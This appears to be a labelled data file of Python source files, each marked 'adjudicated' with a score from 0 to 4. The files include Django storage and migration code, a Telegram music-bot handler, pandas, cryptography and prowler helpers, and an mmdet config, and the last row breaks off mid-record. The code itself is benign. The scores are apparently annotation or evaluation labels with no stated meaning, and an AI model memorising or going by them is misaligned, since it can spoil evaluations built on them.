351	adjudicated	3	"from django.contrib.messages.storage.base import BaseStorage<<NEWL>>from django.contrib.messages.storage.cookie import CookieStorage<<NEWL>>from django.contrib.messages.storage.session import SessionStorage<<NEWL>><<NEWL>><<NEWL>>class FallbackStorage(BaseStorage):<<NEWL>>    """"""<<NEWL>>    Try to store all messages in the first backend. Store any unstored<<NEWL>>    messages in each subsequent backend.<<NEWL>>    """"""<<NEWL>><<NEWL>>    storage_classes = (CookieStorage, SessionStorage)<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        self.storages = [<<NEWL>>            storage_class(*args, **kwargs) for storage_class in self.storage_classes<<NEWL>>        ]<<NEWL>>        self._used_storages = set()<<NEWL>><<NEWL>>    def _get(self, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Get a single list of messages from all storage backends.<<NEWL>>        """"""<<NEWL>>        all_messages = []<<NEWL>>        for storage in self.storages:<<NEWL>>            messages, all_retrieved = storage._get()<<NEWL>>            # If the backend hasn't been used, no more retrieval is necessary.<<NEWL>>            if messages is None:<<NEWL>>                break<<NEWL>>            if messages:<<NEWL>>                self._used_storages.add(storage)<<NEWL>>            all_messages.extend(messages)<<NEWL>>            # If this storage class contained all the messages, no further<<NEWL>>            # retrieval is necessary<<NEWL>>            if all_retrieved:<<NEWL>>                break<<NEWL>>        return all_messages, all_retrieved<<NEWL>><<NEWL>>    def _store(self, messages, response, *args, **kwargs):<<NEWL>>        """"""<<NEWL>>        Store the messages and return any unstored messages after trying all<<NEWL>>        backends.<<NEWL>><<NEWL>>        For each storage backend, any messages not stored are passed on to the<<NEWL>>        next backend.<<NEWL>>        """"""<<NEWL>>        for storage in self.storages:<<NEWL>>            if messages:<<NEWL>>                messages = storage._store(messages, response, remove_oldest=False)<<NEWL>>            # Even if there are no more messages, continue iterating to ensure<<NEWL>>            # storages which contained messages are flushed.<<NEWL>>            elif storage in self._used_storages:<<NEWL>>                storage._store([], response)<<NEWL>>                self._used_storages.remove(storage)<<NEWL>>        return messages"
173	adjudicated	0	"from pyrogram import filters<<NEWL>><<NEWL>>from config import BANNED_USERS<<NEWL>>from ShizukaXMusic import YouTube, app<<NEWL>>from ShizukaXMusic.utils.channelplay import get_channeplayCB<<NEWL>>from ShizukaXMusic.utils.decorators.language import languageCB<<NEWL>>from ShizukaXMusic.utils.stream.stream import stream<<NEWL>><<NEWL>><<NEWL>>@app.on_callback_query(filters.regex(""LiveStream"") & ~BANNED_USERS)<<NEWL>>@languageCB<<NEWL>>async def play_live_stream(client, CallbackQuery, _):<<NEWL>>    callback_data = CallbackQuery.data.strip()<<NEWL>>    callback_request = callback_data.split(None, 1)[1]<<NEWL>>    vidid, user_id, mode, cplay, fplay = callback_request.split(""|"")<<NEWL>>    if CallbackQuery.from_user.id != int(user_id):<<NEWL>>        try:<<NEWL>>            return await CallbackQuery.answer(_[""playcb_1""], show_alert=True)<<NEWL>>        except:<<NEWL>>            return<<NEWL>>    try:<<NEWL>>        chat_id, channel = await get_channeplayCB(_, cplay, CallbackQuery)<<NEWL>>    except:<<NEWL>>        return<<NEWL>>    video = True if mode == ""v"" else None<<NEWL>>    user_name = CallbackQuery.from_user.first_name<<NEWL>>    await CallbackQuery.message.delete()<<NEWL>>    try:<<NEWL>>        await CallbackQuery.answer()<<NEWL>>    except:<<NEWL>>        pass<<NEWL>>    mystic = await CallbackQuery.message.reply_text(<<NEWL>>        _[""play_2""].format(channel) if channel else _[""play_1""]<<NEWL>>    )<<NEWL>>    try:<<NEWL>>        details, track_id = await YouTube.track(vidid, True)<<NEWL>>    except Exception:<<NEWL>>        return await mystic.edit_text(_[""play_3""])<<NEWL>>    ffplay = True if fplay == ""f"" else None<<NEWL>>    if not details[""duration_min""]:<<NEWL>>        try:<<NEWL>>            await stream(<<NEWL>>                _,<<NEWL>>                mystic,<<NEWL>>                user_id,<<NEWL>>                details,<<NEWL>>                chat_id,<<NEWL>>                user_name,<<NEWL>>                CallbackQuery.message.chat.id,<<NEWL>>                video,<<NEWL>>                streamtype=""live"",<<NEWL>>                forceplay=ffplay,<<NEWL>>            )<<NEWL>>        except Exception as e:<<NEWL>>            ex_type = type(e).__name__<<NEWL>>            err = e if ex_type == ""AssistantErr"" else _[""general_3""].format(ex_type)<<NEWL>>            return await mystic.edit_text(err)<<NEWL>>    else:<<NEWL>>        return await mystic.edit_text(""ɪ ᴅᴏɴ'ᴛ ᴛʜɪɴᴋ ᴛʜᴀᴛ ɪᴛ's ᴀ ʟɪᴠᴇ sᴛʀᴇᴀᴍ."")<<NEWL>>    await mystic.delete()"
33	adjudicated	3	"import sys<<NEWL>><<NEWL>><<NEWL>>class VendorImporter:<<NEWL>>    """"""<<NEWL>>    A PEP 302 meta path importer for finding optionally-vendored<<NEWL>>    or otherwise naturally-installed packages from root_name.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, root_name, vendored_names=(), vendor_pkg=None):<<NEWL>>        self.root_name = root_name<<NEWL>>        self.vendored_names = set(vendored_names)<<NEWL>>        self.vendor_pkg = vendor_pkg or root_name.replace('extern', '_vendor')<<NEWL>><<NEWL>>    @property<<NEWL>>    def search_path(self):<<NEWL>>        """"""<<NEWL>>        Search first the vendor package then as a natural package.<<NEWL>>        """"""<<NEWL>>        yield self.vendor_pkg + '.'<<NEWL>>        yield ''<<NEWL>><<NEWL>>    def find_module(self, fullname, path=None):<<NEWL>>        """"""<<NEWL>>        Return self when fullname starts with root_name and the<<NEWL>>        target module is one vendored through this importer.<<NEWL>>        """"""<<NEWL>>        root, base, target = fullname.partition(self.root_name + '.')<<NEWL>>        if root:<<NEWL>>            return<<NEWL>>        if not any(map(target.startswith, self.vendored_names)):<<NEWL>>            return<<NEWL>>        return self<<NEWL>><<NEWL>>    def load_module(self, fullname):<<NEWL>>        """"""<<NEWL>>        Iterate over the search path to locate and load fullname.<<NEWL>>        """"""<<NEWL>>        root, base, target = fullname.partition(self.root_name + '.')<<NEWL>>        for prefix in self.search_path:<<NEWL>>            try:<<NEWL>>                extant = prefix + target<<NEWL>>                __import__(extant)<<NEWL>>                mod = sys.modules[extant]<<NEWL>>                sys.modules[fullname] = mod<<NEWL>>                return mod<<NEWL>>            except ImportError:<<NEWL>>                pass<<NEWL>>        else:<<NEWL>>            raise ImportError(<<NEWL>>                ""The '{target}' package is required; ""<<NEWL>>                ""normally this is bundled with this package so if you get ""<<NEWL>>                ""this warning, consult the packager of your ""<<NEWL>>                ""distribution."".format(**locals())<<NEWL>>            )<<NEWL>><<NEWL>>    def install(self):<<NEWL>>        """"""<<NEWL>>        Install this importer into sys.meta_path if not already present.<<NEWL>>        """"""<<NEWL>>        if self not in sys.meta_path:<<NEWL>>            sys.meta_path.append(self)<<NEWL>><<NEWL>><<NEWL>>names = 'six', 'packaging', 'pyparsing', 'ordered_set',<<NEWL>>VendorImporter(__name__, names, 'setuptools._vendor').install()"
122	adjudicated	3	"# Copyright 2021 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     https://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import uuid<<NEWL>><<NEWL>>import google.auth<<NEWL>><<NEWL>>from google.cloud import speech_v1p1beta1 as speech<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>import speech_model_adaptation_beta<<NEWL>><<NEWL>><<NEWL>>STORAGE_URI = ""gs://cloud-samples-data/speech/brooklyn_bridge.raw""<<NEWL>>_, PROJECT_ID = google.auth.default()<<NEWL>>LOCATION = ""global""<<NEWL>>client = speech.AdaptationClient()<<NEWL>><<NEWL>><<NEWL>>def test_model_adaptation_beta(custom_class_id, phrase_set_id, capsys):<<NEWL>>    class_id = custom_class_id<<NEWL>>    phrase_id = phrase_set_id<<NEWL>>    transcript = speech_model_adaptation_beta.transcribe_with_model_adaptation(<<NEWL>>        PROJECT_ID, LOCATION, STORAGE_URI, class_id, phrase_id<<NEWL>>    )<<NEWL>>    assert ""how long is the Brooklyn Bridge"" in transcript<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def custom_class_id():<<NEWL>>    # The custom class id can't be too long<<NEWL>>    custom_class_id = f""customClassId{str(uuid.uuid4())[:8]}""<<NEWL>>    yield custom_class_id<<NEWL>>    # clean up resources<<NEWL>>    CLASS_PARENT = (<<NEWL>>        f""projects/{PROJECT_ID}/locations/{LOCATION}/customClasses/{custom_class_id}""<<NEWL>>    )<<NEWL>>    client.delete_custom_class(name=CLASS_PARENT)<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def phrase_set_id():<<NEWL>>    # The phrase set id can't be too long<<NEWL>>    phrase_set_id = f""phraseSetId{str(uuid.uuid4())[:8]}""<<NEWL>>    yield phrase_set_id<<NEWL>>    # clean up resources<<NEWL>>    PHRASE_PARENT = (<<NEWL>>        f""projects/{PROJECT_ID}/locations/{LOCATION}/phraseSets/{phrase_set_id}""<<NEWL>>    )<<NEWL>>    client.delete_phrase_set(name=PHRASE_PARENT)"
62	adjudicated	3	"from __future__ import annotations<<NEWL>><<NEWL>>import warnings<<NEWL>><<NEWL>>import numpy as np<<NEWL>>import pyarrow<<NEWL>><<NEWL>>from pandas.errors import PerformanceWarning<<NEWL>>from pandas.util._exceptions import find_stack_level<<NEWL>><<NEWL>><<NEWL>>def fallback_performancewarning(version: str | None = None) -> None:<<NEWL>>    """"""<<NEWL>>    Raise a PerformanceWarning for falling back to ExtensionArray's<<NEWL>>    non-pyarrow method<<NEWL>>    """"""<<NEWL>>    msg = ""Falling back on a non-pyarrow code path which may decrease performance.""<<NEWL>>    if version is not None:<<NEWL>>        msg += f"" Upgrade to pyarrow >={version} to possibly suppress this warning.""<<NEWL>>    warnings.warn(msg, PerformanceWarning, stacklevel=find_stack_level())<<NEWL>><<NEWL>><<NEWL>>def pyarrow_array_to_numpy_and_mask(<<NEWL>>    arr, dtype: np.dtype<<NEWL>>) -> tuple[np.ndarray, np.ndarray]:<<NEWL>>    """"""<<NEWL>>    Convert a primitive pyarrow.Array to a numpy array and boolean mask based<<NEWL>>    on the buffers of the Array.<<NEWL>><<NEWL>>    At the moment pyarrow.BooleanArray is not supported.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    arr : pyarrow.Array<<NEWL>>    dtype : numpy.dtype<<NEWL>><<NEWL>>    Returns<<NEWL>>    -------<<NEWL>>    (data, mask)<<NEWL>>        Tuple of two numpy arrays with the raw data (with specified dtype) and<<NEWL>>        a boolean mask (validity mask, so False means missing)<<NEWL>>    """"""<<NEWL>>    dtype = np.dtype(dtype)<<NEWL>><<NEWL>>    buflist = arr.buffers()<<NEWL>>    # Since Arrow buffers might contain padding and the data might be offset,<<NEWL>>    # the buffer gets sliced here before handing it to numpy.<<NEWL>>    # See also https://github.com/pandas-dev/pandas/issues/40896<<NEWL>>    offset = arr.offset * dtype.itemsize<<NEWL>>    length = len(arr) * dtype.itemsize<<NEWL>>    data_buf = buflist[1][offset : offset + length]<<NEWL>>    data = np.frombuffer(data_buf, dtype=dtype)<<NEWL>>    bitmask = buflist[0]<<NEWL>>    if bitmask is not None:<<NEWL>>        mask = pyarrow.BooleanArray.from_buffers(<<NEWL>>            pyarrow.bool_(), len(arr), [None, bitmask], offset=arr.offset<<NEWL>>        )<<NEWL>>        mask = np.asarray(mask)<<NEWL>>    else:<<NEWL>>        mask = np.ones(len(arr), dtype=bool)<<NEWL>>    return data, mask"
365	adjudicated	0	"from sqlalchemy import create_engine<<NEWL>>import pandas as pd<<NEWL>><<NEWL>>class Manager:<<NEWL>>    __instance = None<<NEWL>><<NEWL>>    def __init__(self, engine=None, username=None, password=None, database=None, host=None, port=None):<<NEWL>>        if Manager.__instance is None:<<NEWL>>            self.engine_type = engine<<NEWL>>            self.username = username<<NEWL>>            self.password = password<<NEWL>>            self.database = database<<NEWL>>            self.host = host<<NEWL>>            self.port = port<<NEWL>>            self.url = self._generate_url()<<NEWL>>            self.engine = create_engine(self.url)<<NEWL>>            Manager.__instance = self<<NEWL>>        else:<<NEWL>>            raise Exception(""Cannot create multiple instances of Database class"")<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def get_instance(engine=None, username=None, password=None, database=None, host=None, port=None):<<NEWL>>        if Manager.__instance is None:<<NEWL>>            Manager(engine, username, password, database, host, port)<<NEWL>>        return Manager.__instance<<NEWL>><<NEWL>>    def _generate_url(self):<<NEWL>>        if self.engine_type == 'postgresql':<<NEWL>>            return f""postgresql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        elif self.engine_type == 'mysql':<<NEWL>>            return f""mysql+pymysql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        elif self.engine_type == 'sqlite':<<NEWL>>            return f""sqlite:///{self.database}""<<NEWL>>        elif self.engine_type == 'oracle':<<NEWL>>            return f""oracle://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        elif self.engine_type == 'mssql':<<NEWL>>            return f""mssql+pymssql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""<<NEWL>>        else:<<NEWL>>            raise Exception(""Unsupported engine type"")<<NEWL>><<NEWL>>    def execute_query(self, query):<<NEWL>>        with self.engine.connect() as conn:<<NEWL>>            result = conn.execute(query)<<NEWL>>            data = pd.DataFrame(result.fetchall(), columns=result.keys())<<NEWL>>        return data"
225	adjudicated	0	"from django.contrib.auth.management.commands import createsuperuser<<NEWL>>from django.core.management import CommandError<<NEWL>>from django.db.models import EmailField<<NEWL>>from allauth.account.models import EmailAddress<<NEWL>><<NEWL>><<NEWL>>class Command(createsuperuser.Command):<<NEWL>>    help = 'Crate a superuser, and allow password to be provided'<<NEWL>><<NEWL>>    def add_arguments(self, parser):<<NEWL>>        super(Command, self).add_arguments(parser)<<NEWL>>        parser.add_argument(<<NEWL>>            '--password', dest='password', default=None,<<NEWL>>            help='Specifies the password for the superuser.',<<NEWL>>        )<<NEWL>>        if self.UserModel.USERNAME_FIELD != ""username"":<<NEWL>>            parser.add_argument(<<NEWL>>                '--username', dest='username', default=None,<<NEWL>>                help=""Specifies the username for the superuser""<<NEWL>>            )<<NEWL>><<NEWL>>    def handle(self, *args, **options):<<NEWL>>        password = options.get('password')<<NEWL>>        username = options.get('username')<<NEWL>>        database = options.get('database')<<NEWL>>        email = options.get('email')<<NEWL>><<NEWL>>        User = self.UserModel<<NEWL>>        username_field_type = type(User._meta.get_field(User.USERNAME_FIELD))<<NEWL>>        username = email if username_field_type == EmailField else username<<NEWL>>        username_type = ""email"" if username_field_type == EmailField else ""username""<<NEWL>>        if not password or not username:<<NEWL>>            raise CommandError(f""You need to specify both password and {username_type}."")<<NEWL>>        options.update({User.USERNAME_FIELD: username})<<NEWL>>        super(Command, self).handle(*args, **options)<<NEWL>><<NEWL>>        user = self.UserModel._default_manager.db_manager(database).get(**{User.USERNAME_FIELD: username})<<NEWL>>        if password:<<NEWL>>            user.set_password(password)<<NEWL>>            user.save()<<NEWL>><<NEWL>>        if email:<<NEWL>>            EmailAddress.objects.create(user=user, email=email, primary=True, verified=True)"
334	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography.hazmat.primitives import hashes<<NEWL>>from cryptography.hazmat.primitives.asymmetric.utils import Prehashed<<NEWL>><<NEWL>>if typing.TYPE_CHECKING:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import Backend<<NEWL>><<NEWL>><<NEWL>>def _evp_pkey_derive(backend: ""Backend"", evp_pkey, peer_public_key) -> bytes:<<NEWL>>    ctx = backend._lib.EVP_PKEY_CTX_new(evp_pkey, backend._ffi.NULL)<<NEWL>>    backend.openssl_assert(ctx != backend._ffi.NULL)<<NEWL>>    ctx = backend._ffi.gc(ctx, backend._lib.EVP_PKEY_CTX_free)<<NEWL>>    res = backend._lib.EVP_PKEY_derive_init(ctx)<<NEWL>>    backend.openssl_assert(res == 1)<<NEWL>>    res = backend._lib.EVP_PKEY_derive_set_peer(ctx, peer_public_key._evp_pkey)<<NEWL>>    if res != 1:<<NEWL>>        errors_with_text = backend._consume_errors_with_text()<<NEWL>>        raise ValueError(""Error computing shared key."", errors_with_text)<<NEWL>><<NEWL>>    keylen = backend._ffi.new(""size_t *"")<<NEWL>>    res = backend._lib.EVP_PKEY_derive(ctx, backend._ffi.NULL, keylen)<<NEWL>>    backend.openssl_assert(res == 1)<<NEWL>>    backend.openssl_assert(keylen[0] > 0)<<NEWL>>    buf = backend._ffi.new(""unsigned char[]"", keylen[0])<<NEWL>>    res = backend._lib.EVP_PKEY_derive(ctx, buf, keylen)<<NEWL>>    if res != 1:<<NEWL>>        errors_with_text = backend._consume_errors_with_text()<<NEWL>>        raise ValueError(""Error computing shared key."", errors_with_text)<<NEWL>><<NEWL>>    return backend._ffi.buffer(buf, keylen[0])[:]<<NEWL>><<NEWL>><<NEWL>>def _calculate_digest_and_algorithm(<<NEWL>>    data: bytes,<<NEWL>>    algorithm: typing.Union[Prehashed, hashes.HashAlgorithm],<<NEWL>>) -> typing.Tuple[bytes, hashes.HashAlgorithm]:<<NEWL>>    if not isinstance(algorithm, Prehashed):<<NEWL>>        hash_ctx = hashes.Hash(algorithm)<<NEWL>>        hash_ctx.update(data)<<NEWL>>        data = hash_ctx.finalize()<<NEWL>>    else:<<NEWL>>        algorithm = algorithm._algorithm<<NEWL>><<NEWL>>    if len(data) != algorithm.digest_size:<<NEWL>>        raise ValueError(<<NEWL>>            ""The provided data must be the same length as the hash ""<<NEWL>>            ""algorithm's digest size.""<<NEWL>>        )<<NEWL>><<NEWL>>    return (data, algorithm)"
274	adjudicated	0	"import threading<<NEWL>>from dataclasses import dataclass<<NEWL>><<NEWL>>from prowler.lib.logger import logger<<NEWL>>from prowler.providers.aws.aws_provider import generate_regional_clients<<NEWL>><<NEWL>><<NEWL>>################## Macie<<NEWL>>class Macie:<<NEWL>>    def __init__(self, audit_info):<<NEWL>>        self.service = ""macie2""<<NEWL>>        self.session = audit_info.audit_session<<NEWL>>        self.audited_account = audit_info.audited_account<<NEWL>>        self.regional_clients = generate_regional_clients(self.service, audit_info)<<NEWL>>        self.sessions = []<<NEWL>>        self.__threading_call__(self.__get_macie_session__)<<NEWL>><<NEWL>>    def __get_session__(self):<<NEWL>>        return self.session<<NEWL>><<NEWL>>    def __threading_call__(self, call):<<NEWL>>        threads = []<<NEWL>>        for regional_client in self.regional_clients.values():<<NEWL>>            threads.append(threading.Thread(target=call, args=(regional_client,)))<<NEWL>>        for t in threads:<<NEWL>>            t.start()<<NEWL>>        for t in threads:<<NEWL>>            t.join()<<NEWL>><<NEWL>>    def __get_macie_session__(self, regional_client):<<NEWL>>        logger.info(""Macie - Get Macie Session..."")<<NEWL>>        try:<<NEWL>>            self.sessions.append(<<NEWL>>                Session(<<NEWL>>                    regional_client.get_macie_session()[""status""],<<NEWL>>                    regional_client.region,<<NEWL>>                )<<NEWL>>            )<<NEWL>><<NEWL>>        except Exception as error:<<NEWL>>            if ""Macie is not enabled"" in str(error):<<NEWL>>                self.sessions.append(<<NEWL>>                    Session(<<NEWL>>                        ""DISABLED"",<<NEWL>>                        regional_client.region,<<NEWL>>                    )<<NEWL>>                )<<NEWL>>            else:<<NEWL>>                logger.error(<<NEWL>>                    f""{regional_client.region} -- {error.__class__.__name__}[{error.__traceback__.tb_lineno}]: {error}""<<NEWL>>                )<<NEWL>><<NEWL>><<NEWL>>@dataclass<<NEWL>>class Session:<<NEWL>>    status: str<<NEWL>>    region: str<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        status,<<NEWL>>        region,<<NEWL>>    ):<<NEWL>>        self.status = status<<NEWL>>        self.region = region"
56	adjudicated	4	"import re<<NEWL>><<NEWL>>from ._functools import method_cache<<NEWL>><<NEWL>><<NEWL>># from jaraco.text 3.5<<NEWL>>class FoldedCase(str):<<NEWL>>    """"""<<NEWL>>    A case insensitive string class; behaves just like str<<NEWL>>    except compares equal when the only variation is case.<<NEWL>><<NEWL>>    >>> s = FoldedCase('hello world')<<NEWL>><<NEWL>>    >>> s == 'Hello World'<<NEWL>>    True<<NEWL>><<NEWL>>    >>> 'Hello World' == s<<NEWL>>    True<<NEWL>><<NEWL>>    >>> s != 'Hello World'<<NEWL>>    False<<NEWL>><<NEWL>>    >>> s.index('O')<<NEWL>>    4<<NEWL>><<NEWL>>    >>> s.split('O')<<NEWL>>    ['hell', ' w', 'rld']<<NEWL>><<NEWL>>    >>> sorted(map(FoldedCase, ['GAMMA', 'alpha', 'Beta']))<<NEWL>>    ['alpha', 'Beta', 'GAMMA']<<NEWL>><<NEWL>>    Sequence membership is straightforward.<<NEWL>><<NEWL>>    >>> ""Hello World"" in [s]<<NEWL>>    True<<NEWL>>    >>> s in [""Hello World""]<<NEWL>>    True<<NEWL>><<NEWL>>    You may test for set inclusion, but candidate and elements<<NEWL>>    must both be folded.<<NEWL>><<NEWL>>    >>> FoldedCase(""Hello World"") in {s}<<NEWL>>    True<<NEWL>>    >>> s in {FoldedCase(""Hello World"")}<<NEWL>>    True<<NEWL>><<NEWL>>    String inclusion works as long as the FoldedCase object<<NEWL>>    is on the right.<<NEWL>><<NEWL>>    >>> ""hello"" in FoldedCase(""Hello World"")<<NEWL>>    True<<NEWL>><<NEWL>>    But not if the FoldedCase object is on the left:<<NEWL>><<NEWL>>    >>> FoldedCase('hello') in 'Hello World'<<NEWL>>    False<<NEWL>><<NEWL>>    In that case, use in_:<<NEWL>><<NEWL>>    >>> FoldedCase('hello').in_('Hello World')<<NEWL>>    True<<NEWL>><<NEWL>>    >>> FoldedCase('hello') > FoldedCase('Hello')<<NEWL>>    False<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __lt__(self, other):<<NEWL>>        return self.lower() < other.lower()<<NEWL>><<NEWL>>    def __gt__(self, other):<<NEWL>>        return self.lower() > other.lower()<<NEWL>><<NEWL>>    def __eq__(self, other):<<NEWL>>        return self.lower() == other.lower()<<NEWL>><<NEWL>>    def __ne__(self, other):<<NEWL>>        return self.lower() != other.lower()<<NEWL>><<NEWL>>    def __hash__(self):<<NEWL>>        return hash(self.lower())<<NEWL>><<NEWL>>    def __contains__(self, other):<<NEWL>>        return super().lower().__contains__(other.lower())<<NEWL>><<NEWL>>    def in_(self, other):<<NEWL>>        ""Does self appear in other?""<<NEWL>>        return self in FoldedCase(other)<<NEWL>><<NEWL>>    # cache lower since it's likely to be called frequently.<<NEWL>>    @method_cache<<NEWL>>    def lower(self):<<NEWL>>        return super().lower()<<NEWL>><<NEWL>>    def index(self, sub):<<NEWL>>        return self.lower().index(sub.lower())<<NEWL>><<NEWL>>    def split(self, splitter=' ', maxsplit=0):<<NEWL>>        pattern = re.compile(re.escape(splitter), re.I)<<NEWL>>        return pattern.split(self, maxsplit)"
287	adjudicated	0	_base_ = [<<NEWL>>    '../_base_/datasets/coco_detection.py',<<NEWL>>    '../_base_/schedules/schedule_1x.py', '../_base_/default_runtime.py'<<NEWL>>]<<NEWL>>model = dict(<<NEWL>>    type='ATSS',<<NEWL>>    backbone=dict(<<NEWL>>        type='ResNet',<<NEWL>>        depth=50,<<NEWL>>        num_stages=4,<<NEWL>>        out_indices=(0, 1, 2, 3),<<NEWL>>        frozen_stages=1,<<NEWL>>        norm_cfg=dict(type='BN', requires_grad=True),<<NEWL>>        norm_eval=True,<<NEWL>>        style='pytorch',<<NEWL>>        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),<<NEWL>>    neck=[<<NEWL>>        dict(<<NEWL>>            type='FPN',<<NEWL>>            in_channels=[256, 512, 1024, 2048],<<NEWL>>            out_channels=256,<<NEWL>>            start_level=1,<<NEWL>>            add_extra_convs='on_output',<<NEWL>>            num_outs=5),<<NEWL>>        dict(type='DyHead', in_channels=256, out_channels=256, num_blocks=6)<<NEWL>>    ],<<NEWL>>    bbox_head=dict(<<NEWL>>        type='ATSSHead',<<NEWL>>        num_classes=80,<<NEWL>>        in_channels=256,<<NEWL>>        stacked_convs=0,<<NEWL>>        feat_channels=256,<<NEWL>>        anchor_generator=dict(<<NEWL>>            type='AnchorGenerator',<<NEWL>>            ratios=[1.0],<<NEWL>>            octave_base_scale=8,<<NEWL>>            scales_per_octave=1,<<NEWL>>            strides=[8, 16, 32, 64, 128]),<<NEWL>>        bbox_coder=dict(<<NEWL>>            type='DeltaXYWHBBoxCoder',<<NEWL>>            target_means=[.0, .0, .0, .0],<<NEWL>>            target_stds=[0.1, 0.1, 0.2, 0.2]),<<NEWL>>        loss_cls=dict(<<NEWL>>            type='FocalLoss',<<NEWL>>            use_sigmoid=True,<<NEWL>>            gamma=2.0,<<NEWL>>            alpha=0.25,<<NEWL>>            loss_weight=1.0),<<NEWL>>        loss_bbox=dict(type='GIoULoss', loss_weight=2.0),<<NEWL>>        loss_centerness=dict(<<NEWL>>            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0)),<<NEWL>>    # training and testing settings<<NEWL>>    train_cfg=dict(<<NEWL>>        assigner=dict(type='ATSSAssigner', topk=9),<<NEWL>>        allowed_border=-1,<<NEWL>>        pos_weight=-1,<<NEWL>>        debug=False),<<NEWL>>    test_cfg=dict(<<NEWL>>        nms_pre=1000,<<NEWL>>        min_bbox_size=0,<<NEWL>>        score_thr=0.05,<<NEWL>>        nms=dict(type='nms', iou_threshold=0.6),<<NEWL>>        max_per_img=100))<<NEWL>># optimizer<<NEWL>>optimizer = dict(type='SGD', lr=0.01, momentum=0.9, weight_decay=0.0001)
116	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""scatter"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
396	adjudicated	0	# Generated by Django 3.2.18 on 2023-03-09 11:26<<NEWL>><<NEWL>>from django.db import migrations, models<<NEWL>>import django.db.models.deletion<<NEWL>>import multiselectfield.db.fields<<NEWL>><<NEWL>><<NEWL>>class Migration(migrations.Migration):<<NEWL>><<NEWL>>    initial = True<<NEWL>><<NEWL>>    dependencies = [<<NEWL>>    ]<<NEWL>><<NEWL>>    operations = [<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Event',<<NEWL>>            fields=[<<NEWL>>                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),<<NEWL>>                ('event_name', models.CharField(max_length=200, unique=True)),<<NEWL>>                ('event_date', models.DateField()),<<NEWL>>                ('event_time', models.TimeField()),<<NEWL>>                ('created_on', models.DateTimeField(auto_now_add=True)),<<NEWL>>            ],<<NEWL>>        ),<<NEWL>>        migrations.CreateModel(<<NEWL>>            name='Guest',<<NEWL>>            fields=[<<NEWL>>                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),<<NEWL>>                ('guest_name', models.CharField(max_length=200, unique=True)),<<NEWL>>                ('slug', models.SlugField(max_length=200, unique=True)),<<NEWL>>                ('email', models.EmailField(max_length=254)),<<NEWL>>                ('is_attending', models.BooleanField(choices=[(False, 'No'), (True, 'Yes')], default='', verbose_name='Attending?')),<<NEWL>>                ('message', models.TextField(blank=True)),<<NEWL>>                ('dietary_requirements', multiselectfield.db.fields.MultiSelectField(choices=[(1, 'none'), (2, 'coeliac'), (3, 'food allergy'), (4, 'food intolerance'), (5, 'vegetarian'), (6, 'vegan'), (7, 'pescatarian'), (8, 'teetotal')], max_length=15)),<<NEWL>>                